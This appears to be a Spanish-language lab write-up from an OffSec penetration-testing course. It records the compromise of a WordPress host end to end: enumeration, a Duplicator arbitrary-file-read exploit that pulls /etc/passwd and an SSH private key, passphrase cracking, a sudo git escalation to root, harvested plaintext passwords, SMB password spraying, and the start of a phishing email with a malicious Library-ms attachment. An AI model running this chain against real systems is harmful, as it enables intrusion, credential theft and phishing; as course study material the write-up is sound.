# {CATEGORÍA}: {DESCRIPCIÓN}

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}
## Objetivo
{OBJETIVO}
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion WEBSRV1
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# cat 244-nmap.txt      
# Nmap 7.95 scan initiated Fri Jun 20 12:31:44 2025 as: /usr/lib/nmap/nmap -sC -sV -Pn -oN 244-nmap.txt 192.168.190.244
Nmap scan report for 192.168.190.244
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.190.244/main/
|_http-generator: WordPress 6.0.2
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 20 12:32:02 2025 -- 1 IP address (1 host up) scanned in 18.17 seconds
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# whatweb http://192.168.234.244
http://192.168.234.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.234.244], RedirectLocation[http://192.168.234.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.234.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.234.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# wpscan --url http://192.168.234.244 --enumerate p --plugins-detection aggressive -o wpscan        
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# cat wpscan      
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.234.244/ [192.168.234.244]
[+] Effective URL: http://192.168.234.244/main/
[+] Started: Sat Jun 21 18:35:47 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.52 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.234.244/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.234.244/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.234.244/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0.2 identified (Insecure, released on 2022-08-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.234.244/main/feed/, <generator>https://wordpress.org/?v=6.0.2</generator>
 |  - http://192.168.234.244/main/comments/feed/, <generator>https://wordpress.org/?v=6.0.2</generator>

[+] WordPress theme in use: hello-elementor
 | Location: http://192.168.234.244/wp-content/themes/hello-elementor/
 | Last Updated: 2025-01-21T00:00:00.000Z
 | Readme: http://192.168.234.244/wp-content/themes/hello-elementor/readme.txt
 | [!] The version is out of date, the latest version is 3.3.0
 | Style URL: http://192.168.234.244/wp-content/themes/hello-elementor/style.css
 | Style Name: Hello Elementor
 | Style URI: https://elementor.com/hello-theme/?utm_source=wp-themes&utm_campaign=theme-uri&utm_medium=wp-dash
 | Description: A plain-vanilla & lightweight theme for Elementor page builder...
 | Author: Elementor Team
 | Author URI: https://elementor.com/?utm_source=wp-themes&utm_campaign=author-uri&utm_medium=wp-dash
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.6.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.234.244/wp-content/themes/hello-elementor/style.css, Match: 'Version: 2.6.1'


[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.234.244/wp-content/plugins/akismet/
 | Latest Version: 5.3.5
 | Last Updated: 2024-11-19T02:02:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] classic-editor
 | Location: http://192.168.234.244/wp-content/plugins/classic-editor/
 | Last Updated: 2024-12-03T21:03:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/classic-editor/readme.txt
 | [!] The version is out of date, the latest version is 1.6.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/classic-editor/, status: 403
 |
 | Version: 1.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/classic-editor/readme.txt

[+] contact-form-7
 | Location: http://192.168.234.244/wp-content/plugins/contact-form-7/
 | Last Updated: 2025-01-14T02:31:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/contact-form-7/readme.txt
 | [!] The version is out of date, the latest version is 6.0.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/contact-form-7/, status: 403
 |
 | Version: 5.6.3 (90% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.234.244/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.6.3
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/contact-form-7/readme.txt

[+] duplicator
 | Location: http://192.168.234.244/wp-content/plugins/duplicator/
 | Last Updated: 2024-11-21T15:50:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.11.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.234.244/wp-content/plugins/elementor/
 | Last Updated: 2025-01-23T18:05:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/elementor/readme.txt
 | [!] The version is out of date, the latest version is 3.27.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/elementor/, status: 403
 |
 | Version: 3.7.7 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.234.244/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.7.7
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.234.244/wp-content/plugins/elementor/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.234.244/wp-content/plugins/elementor/readme.txt

[+] wordpress-seo
 | Location: http://192.168.234.244/wp-content/plugins/wordpress-seo/
 | Last Updated: 2025-01-21T09:01:00.000Z
 | Readme: http://192.168.234.244/wp-content/plugins/wordpress-seo/readme.txt
 | [!] The version is out of date, the latest version is 24.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/wordpress-seo/, status: 200
 |
 | Version: 19.7.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/wordpress-seo/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.234.244/wp-content/plugins/wordpress-seo/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jun 21 18:37:34 2025
[+] Requests Done: 1556
[+] Cached Requests: 16
[+] Data Sent: 433.51 KB
[+] Data Received: 910.466 KB
[+] Memory used: 238.773 MB
[+] Elapsed time: 00:01:46
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/27.1.2]
└─# searchsploit duplicator
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                                                                                                              | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery                                                                                                 | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                                                                                                                        | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                                                                                                                       | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                                                                                                        | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)                                                                                           | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                                                                                                             | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                                                                                                                      | php/webapps/50993.txt
WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Exposure to Account Takeover                                                                             | php/webapps/51874.py
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery                                                                                                 | php/webapps/40908.html
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
#### Paso 2: Explotacion WEBSRV1
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# searchsploit -m 50420

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# python3 50420.py http://192.168.234.244 /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# python3 50420.py http://192.168.234.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# ssh2john id_rsa > ssh.hash
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (id_rsa)     
1g 0:00:01:40 DONE (2025-06-21 19:05) 0.009968g/s 14.03p/s 14.03c/s 14.03C/s teacher..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# ssh -i id_rsa daniela@192.168.234.244           
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 21 11:16:16 PM UTC 2025

  System load:  0.0               Processes:               209
  Usage of /:   73.9% of 8.02GB   Users logged in:         0
  Memory usage: 22%               IPv4 address for ens192: 192.168.234.244
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

13 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
daniela@websrv1:~$ 
```

#### Escalada de privilegios en WEBSRV1

```bash
# En kali:
──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# cp /usr/share/peass/linpeas/linpeas.sh .

# En WEBSRV1

daniela@websrv1:~$ wget http://192.168.45.213:8000/linpeas.sh
--2025-06-21 23:18:43--  http://192.168.45.213:8000/linpeas.sh
Connecting to 192.168.45.213:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                           100%[====================================================================================================================>] 820.39K   788KB/s    in 1.0s    

2025-06-21 23:18:44 (788 KB/s) - ‘linpeas.sh’ saved [840082/840082]

daniela@websrv1:~$ ls
linpeas.sh  snap
daniela@websrv1:~$ chmod a+x ./linpeas.sh
daniela@websrv1:~$ ./linpeas.sh

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                   
Matching Defaults entries for daniela on websrv1:                                                                                                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git

...

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                                                                                                                 
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );

daniela@websrv1:~$ sudo git -p help config
GIT-CONFIG(1)                                                                                    Git Manual                                                                                    GIT-CONFIG(1)

NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [<file-option>] [--type=<type>] [--fixed-value] [--show-origin] [--show-scope] [-z|--null] name [value [value-pattern]]
       git config [<file-option>] [--type=<type>] --add name value
       git config [<file-option>] [--type=<type>] [--fixed-value] --replace-all name value [value-pattern]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] --get name [value-pattern]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] --get-all name [value-pattern]
       git config [<file-option>] [--type=<type>] [--show-origin] [--show-scope] [-z|--null] [--fixed-value] [--name-only] --get-regexp name_regex [value-pattern]
       git config [<file-option>] [--type=<type>] [-z|--null] --get-urlmatch name URL
       git config [<file-option>] [--fixed-value] --unset name [value-pattern]
       git config [<file-option>] [--fixed-value] --unset-all name [value-pattern]
       git config [<file-option>] --rename-section old_name new_name
       git config [<file-option>] --remove-section name
       git config [<file-option>] [--show-origin] [--show-scope] [-z|--null] [--name-only] -l | --list
       git config [<file-option>] --get-color name [default]
       git config [<file-option>] --get-colorbool name [stdout-is-tty]
       git config [<file-option>] -e | --edit

DESCRIPTION
       You can query/set/replace/unset options with this command. The name is actually the section and the key separated by a dot, and the value will be escaped.

       Multiple lines can be added to an option by using the --add option. If you want to update or unset an option which can occur on multiple lines, a value-pattern (which is an extended regular
       expression, unless the --fixed-value option is given) needs to be given. Only the existing values that match the pattern are updated or unset. If you want to handle the lines that do not match the
       pattern, just prepend a single exclamation mark in front (see also the section called “EXAMPLES”), but note that this only works when the --fixed-value option is not in use.

       The --type=<type> option instructs git config to ensure that incoming and outgoing values are canonicalize-able under the given <type>. If no --type=<type> is given, no canonicalization will be
       performed. Callers may unset an existing --type specifier with --no-type.

       When reading, the values are read from the system, global and repository local configuration files by default, and options --system, --global, --local, --worktree and --file <filename> can be used
       to tell the command to read from only that location (see the section called “FILES”).

       When writing, the new value is written to the repository local configuration file by default, and options --system, --global, --worktree, --file <filename> can be used to tell the command to write
       to that location (you can say --local but that is the default).

       This command will fail with non-zero status upon error. Some exit codes are:

       •   The section or key is invalid (ret=1),

       •   no section or name was provided (ret=2),

       •   the config file is invalid (ret=3),

       •   the config file cannot be written (ret=4),

       •   you try to unset an option which does not exist (ret=5),

       •   you try to unset/set an option for which multiple lines match (ret=5), or

       •   you try to use an invalid regexp (ret=6).

       On success, the command returns the exit code 0.

       A list of all available configuration variables can be obtained using the git help --config command.

OPTIONS
       --replace-all
           Default behavior is to replace at most one line. This replaces all lines matching the key (and optionally the value-pattern).

       --add
!/bin/bash
root@websrv1:/home/daniela# whoami
root
root@websrv1:/home/daniela# 
```

#### POST explotacion WEBSRV1:
```bash
root@websrv1:/home/daniela# cd /srv/www/wordpress
root@websrv1:/srv/www/wordpress# git status
HEAD detached at 612ff57
nothing to commit, working tree clean
root@websrv1:/srv/www/wordpress# git log
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
Author: root <root@websrv1>
Date:   Tue Sep 27 14:24:28 2022 +0000

    initial commit
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
deleted file mode 100644
index 25667c7..0000000
--- a/fetch_current.sh
+++ /dev/null
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-# Script to obtain the current state of the web app from the staging server
-
-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
-
```
#### En kali:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# crackmapexec smb 192.168.234.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.234.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\offsec:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\offsec:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.234.242 445    MAILSRV1         [-] beyond.com\offsec:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WEBSRV1]
└─# crackmapexec smb 192.168.234.242 -u john -p "dqsTwTpZPn#nL" --shares
SMB         192.168.234.242 445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.234.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.234.242 445    MAILSRV1         [+] Enumerated shares
SMB         192.168.234.242 445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.234.242 445    MAILSRV1         -----           -----------     ------
SMB         192.168.234.242 445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.234.242 445    MAILSRV1         C$                              Default share
SMB         192.168.234.242 445    MAILSRV1         IPC$            READ            Remote IPC
```

#### Acceso a la red interna: phishing

> Preparamos nuestros archivos config.Library-ms, automatic-configuration.lnk con los correspondientes payloads en el servidor webdav y servimos powercat.ps1

```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
└─# swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.234.242 --body @mail.txt --header "Subject: Staging Script" --suppress-data -ap                                       
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.234.242:25...
=== Connected to 192.168.234.242.
